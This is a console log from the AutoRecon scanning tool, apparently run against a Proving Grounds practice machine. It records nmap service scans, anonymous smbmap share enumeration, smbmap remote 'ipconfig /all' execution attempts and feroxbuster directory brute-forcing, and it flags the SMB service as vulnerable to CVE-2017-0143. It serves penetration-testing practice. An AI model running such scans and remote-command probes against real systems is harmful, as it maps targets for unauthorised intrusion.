[!] Service scan SMBClient (tcp/139/netbios-ssn/smbclient) ran a command against 192.168.225.45 which returned a non-zero exit code (1). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan SMBClient (tcp/139/netbios-ssn/smbclient) against 192.168.225.45 finished in 7 seconds
[*] 08:11:10 - There are 26 scans still running against 192.168.225.45: all-tcp-ports, top-100-udp-ports, tcp/80/http/dirbuster, tcp/80/http/curl-robots, tcp/80/http/nmap-http, tcp/80/http/whatweb, tcp/80/http/wkhtmltoimage, tcp/135/msrpc/nmap-msrpc, tcp/135/msrpc/rpcdump, tcp/139/netbios-ssn/enum4linux, tcp/139/netbios-ssn/nmap-smb, tcp/139/netbios-ssn/smbmap, tcp/445/microsoft-ds/nmap-smb, tcp/445/microsoft-ds/smbmap, tcp/49152/msrpc/nmap-msrpc, tcp/49152/msrpc/rpcdump, tcp/49153/msrpc/nmap-msrpc, tcp/49153/msrpc/rpcdump, tcp/49154/msrpc/nmap-msrpc, tcp/49154/msrpc/rpcdump, tcp/49155/msrpc/nmap-msrpc, tcp/49155/msrpc/rpcdump, tcp/49156/msrpc/nmap-msrpc, tcp/49156/msrpc/rpcdump, tcp/49159/msrpc/nmap-msrpc, tcp/49159/msrpc/rpcdump                                                                                                    
[*] [tcp/80/http/curl-robots] There did not appear to be a robots.txt file in the webroot (/).
[!] Service scan Curl Robots (tcp/80/http/curl-robots) ran a command against 192.168.225.45 which returned a non-zero exit code (22). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan Curl Robots (tcp/80/http/curl-robots) against 192.168.225.45 finished in 8 seconds
[!] Service scan wkhtmltoimage (tcp/80/http/wkhtmltoimage) ran a command against 192.168.225.45 which returned a non-zero exit code (1). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan wkhtmltoimage (tcp/80/http/wkhtmltoimage) against 192.168.225.45 finished in 8 seconds
[*] Discovered open port udp/137 on 192.168.225.45
[!] Service scan rpcdump (tcp/49152/msrpc/rpcdump) ran a command against 192.168.225.45 which returned a non-zero exit code (2). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan rpcdump (tcp/49152/msrpc/rpcdump) against 192.168.225.45 finished in 10 seconds
[!] Service scan rpcdump (tcp/49153/msrpc/rpcdump) ran a command against 192.168.225.45 which returned a non-zero exit code (2). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan rpcdump (tcp/49153/msrpc/rpcdump) against 192.168.225.45 finished in 10 seconds
[!] Service scan rpcdump (tcp/49154/msrpc/rpcdump) ran a command against 192.168.225.45 which returned a non-zero exit code (2). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan rpcdump (tcp/49154/msrpc/rpcdump) against 192.168.225.45 finished in 10 seconds
[!] Service scan rpcdump (tcp/49155/msrpc/rpcdump) ran a command against 192.168.225.45 which returned a non-zero exit code (2). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan rpcdump (tcp/49155/msrpc/rpcdump) against 192.168.225.45 finished in 10 seconds
[!] Service scan rpcdump (tcp/49156/msrpc/rpcdump) ran a command against 192.168.225.45 which returned a non-zero exit code (2). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan rpcdump (tcp/49156/msrpc/rpcdump) against 192.168.225.45 finished in 9 seconds
[!] Service scan rpcdump (tcp/49159/msrpc/rpcdump) ran a command against 192.168.225.45 which returned a non-zero exit code (2). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan rpcdump (tcp/49159/msrpc/rpcdump) against 192.168.225.45 finished in 10 seconds
[*] Service scan rpcdump (tcp/135/msrpc/rpcdump) against 192.168.225.45 finished in 15 seconds
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 445 2>&1
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 139 2>&1
[*] Service scan whatweb (tcp/80/http/whatweb) against 192.168.225.45 finished in 18 seconds
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 445 -R 2>&1
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 139 -R 2>&1
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 445 -R 2>&1
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 139 -R 2>&1
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 445 -x "ipconfig /all" 2>&1
[*] Service scan Nmap MSRPC (tcp/135/msrpc/nmap-msrpc) against 192.168.225.45 finished in 31 seconds
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 139 -x "ipconfig /all" 2>&1
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 445 -x "ipconfig /all" 2>&1
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 139 -x "ipconfig /all" 2>&1
[*] Service scan Enum4Linux (tcp/139/netbios-ssn/enum4linux) against 192.168.225.45 finished in 40 seconds
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) against 192.168.225.45 finished in 39 seconds
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) against 192.168.225.45 finished in 41 seconds
[*] 08:12:10 - There are 12 scans still running against 192.168.225.45: all-tcp-ports, top-100-udp-ports, tcp/80/http/dirbuster, tcp/80/http/nmap-http, tcp/139/netbios-ssn/nmap-smb, tcp/445/microsoft-ds/nmap-smb, tcp/49152/msrpc/nmap-msrpc, tcp/49153/msrpc/nmap-msrpc, tcp/49154/msrpc/nmap-msrpc, tcp/49155/msrpc/nmap-msrpc, tcp/49156/msrpc/nmap-msrpc, tcp/49159/msrpc/nmap-msrpc                                                                                                                             
[*] Service scan Nmap MSRPC (tcp/49155/msrpc/nmap-msrpc) against 192.168.225.45 finished in 1 minute, 23 seconds
[*] Service scan Nmap MSRPC (tcp/49156/msrpc/nmap-msrpc) against 192.168.225.45 finished in 1 minute, 23 seconds
[*] Service scan Nmap MSRPC (tcp/49154/msrpc/nmap-msrpc) against 192.168.225.45 finished in 1 minute, 24 seconds
[*] Service scan Nmap MSRPC (tcp/49159/msrpc/nmap-msrpc) against 192.168.225.45 finished in 1 minute, 22 seconds
[*] Service scan Nmap MSRPC (tcp/49152/msrpc/nmap-msrpc) against 192.168.225.45 finished in 1 minute, 28 seconds
[*] Service scan Nmap MSRPC (tcp/49153/msrpc/nmap-msrpc) against 192.168.225.45 finished in 1 minute, 28 seconds
[*] Discovered open port tcp/49154 on 192.168.225.45
[*] 08:13:10 - There are 6 scans still running against 192.168.225.45: all-tcp-ports, top-100-udp-ports, tcp/80/http/dirbuster, tcp/80/http/nmap-http, tcp/139/netbios-ssn/nmap-smb, tcp/445/microsoft-ds/nmap-smb                                                                                                                              
[*] 08:14:10 - There are 6 scans still running against 192.168.225.45: all-tcp-ports, top-100-udp-ports, tcp/80/http/dirbuster, tcp/80/http/nmap-http, tcp/139/netbios-ssn/nmap-smb, tcp/445/microsoft-ds/nmap-smb                                                                                                                              
[*] Port scan Top 100 UDP Ports (top-100-udp-ports) against 192.168.225.45 finished in 5 minutes, 47 seconds
[*] Identified service netbios-ns on udp/137 on 192.168.225.45
[!] [udp/137/netbios-ns/enum4linux against 192.168.225.45] Plugin should only be run once and it appears to have already been queued. Skipping.
[!] [udp/137/netbios-ns/nbtscan against 192.168.225.45] Plugin should only be run once and it appears to have already been queued. Skipping.
[!] [udp/137/netbios-ns/smbclient against 192.168.225.45] Plugin should only be run once and it appears to have already been queued. Skipping.
[*] Service scan Nmap SMB (udp/137/netbios-ns/nmap-smb) running against 192.168.225.45
[*] Service scan Nmap SMB (udp/137/netbios-ns/nmap-smb) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sU -sV -p 137 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/udp137/udp_137_smb_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/udp137/xml/udp_137_smb_nmap.xml" 192.168.225.45
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) running against 192.168.225.45
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 137 2>&1
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 137 2>&1
[*] Service scan Nmap SMB (udp/137/netbios-ns/nmap-smb) against 192.168.225.45 finished in 4 seconds
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 137 -R 2>&1
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 137 -R 2>&1
[*] [192.168.225.45/tcp/445/microsoft-ds/nmap-smb] Nmap script found a potential vulnerability. (State: VULNERABLE)
[*] [192.168.225.45/tcp/445/microsoft-ds/nmap-smb] CVE Identified: CVE-2017-0143
[*] [192.168.225.45/tcp/445/microsoft-ds/nmap-smb] CVE Identified: CVE-2017-0143
[*] Service scan Nmap SMB (tcp/445/microsoft-ds/nmap-smb) against 192.168.225.45 finished in 4 minutes, 2 seconds
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) is running the following command against 192.168.225.45: smbmap -H 192.168.225.45 -P 137 -x "ipconfig /all" 2>&1
[*] Discovered open port tcp/49152 on 192.168.225.45
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) is running the following command against 192.168.225.45: smbmap -u null -p "" -H 192.168.225.45 -P 137 -x "ipconfig /all" 2>&1
[*] 08:15:10 - There are 5 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster, tcp/80/http/nmap-http, tcp/139/netbios-ssn/nmap-smb, udp/137/netbios-ns/smbmap                                                                                                                                                     
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) against 192.168.225.45 finished in 16 seconds
[*] [192.168.225.45/tcp/139/netbios-ssn/nmap-smb] Nmap script found a potential vulnerability. (State: VULNERABLE)
[*] [192.168.225.45/tcp/139/netbios-ssn/nmap-smb] CVE Identified: CVE-2017-0143
[*] [192.168.225.45/tcp/139/netbios-ssn/nmap-smb] CVE Identified: CVE-2017-0143
[*] Service scan Nmap SMB (tcp/139/netbios-ssn/nmap-smb) against 192.168.225.45 finished in 4 minutes, 36 seconds
[*] 08:16:10 - There are 3 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster, tcp/80/http/nmap-http
[*] Discovered open port tcp/49156 on 192.168.225.45
[*] 08:17:10 - There are 3 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster, tcp/80/http/nmap-http
[*] Discovered open port tcp/49159 on 192.168.225.45
[*] 08:18:10 - There are 3 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster, tcp/80/http/nmap-http
[*] [192.168.225.45/tcp/80/http/nmap-http] Identified HTTP Server: GoAhead-Webs
[*] Service scan Nmap HTTP (tcp/80/http/nmap-http) against 192.168.225.45 finished in 7 minutes, 31 seconds
[*] Discovered open port tcp/49155 on 192.168.225.45
[*] 08:19:10 - There are 2 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster
[*] Discovered open port tcp/3573 on 192.168.225.45
[*] 08:20:10 - There are 2 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster
[*] 08:21:10 - There are 2 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster
[*] 08:22:10 - There are 2 scans still running against 192.168.225.45: all-tcp-ports, tcp/80/http/dirbuster
[*] Port scan All TCP Ports (all-tcp-ports) against 192.168.225.45 finished in 13 minutes, 46 seconds
[*] Identified service ms-wbt-server on tcp/3389 on 192.168.225.45
[*] Identified service tag-ups-1 on tcp/3573 on 192.168.225.45
[!] [192.168.225.45] Service tcp/3573/tag-ups-1/insecure did not match any plugins based on the service name.
[*] Service scan Nmap RDP (tcp/3389/ms-wbt-server/nmap-rdp) running against 192.168.225.45
[*] Service scan Nmap RDP (tcp/3389/ms-wbt-server/nmap-rdp) is running the following command against 192.168.225.45: nmap -vv --reason -Pn -T4 -sV -p 3389 --script="banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp3389/tcp_3389_rdp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp3389/xml/tcp_3389_rdp_nmap.xml" 192.168.225.45
[*] Service scan SSL Scan (tcp/3389/ms-wbt-server/ssl-scan) running against 192.168.225.45
[*] Service scan SSL Scan (tcp/3389/ms-wbt-server/ssl-scan) is running the following command against 192.168.225.45: sslscan --show-certificate --no-colour 192.168.225.45:3389 2>&1
[!] Service scan SSL Scan (tcp/3389/ms-wbt-server/ssl-scan) ran a command against 192.168.225.45 which returned a non-zero exit code (1). Check /media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/_errors.log for more details.
[*] Service scan SSL Scan (tcp/3389/ms-wbt-server/ssl-scan) against 192.168.225.45 finished in 16 seconds
[*] 08:23:10 - There are 2 scans still running against 192.168.225.45: tcp/80/http/dirbuster, tcp/3389/ms-wbt-server/nmap-rdp
[*] Service scan Nmap RDP (tcp/3389/ms-wbt-server/nmap-rdp) against 192.168.225.45 finished in 18 seconds
[*] 08:24:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:25:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:26:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:27:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:28:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:29:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:30:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:31:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:32:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:33:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:34:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:35:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:36:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:37:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] Service scan Directory Buster (tcp/80/http/dirbuster) is running the following command against 192.168.225.45: feroxbuster -u http://192.168.225.45:80/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -o "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp80/tcp_80_http_feroxbuster_big.txt"
[*] 08:38:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:39:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:40:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:41:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:42:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:43:10 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:44:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:45:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:46:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:47:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:48:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:49:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:50:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:51:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:52:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:53:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:54:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:55:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:56:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:57:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:58:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 08:59:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:00:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:01:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:02:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:03:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:04:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:05:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:06:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:07:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:08:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:09:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:10:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] 09:11:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] Service scan Directory Buster (tcp/80/http/dirbuster) is running the following command against 192.168.225.45: feroxbuster -u http://192.168.225.45:80/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -o "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Kevin/results/192.168.225.45/scans/tcp80/tcp_80_http_feroxbuster_raft-large-words.txt"
[*] 09:12:11 - There is 1 scan still running against 192.168.225.45: tcp/80/http/dirbuster
[*] Service scan Directory Buster (tcp/80/http/dirbuster) against 192.168.225.45 finished in 1 hour, 1 minute, 11 seconds
[*] Finished scanning target 192.168.225.45 in 1 hour, 3 minutes, 6 seconds
[*] Finished scanning all targets in 1 hour, 3 minutes, 7 seconds!
[*] Don't forget to check out more commands to run manually in the _manual_commands.txt file in each target's scans directory!
[!] AutoRecon identified the following services, but could not match them to any plugins based on the service name. Please report these to Tib3rius: tcp/3389/tcpwrapped/insecure, tcp/3573/tag-ups-1/insecure  
```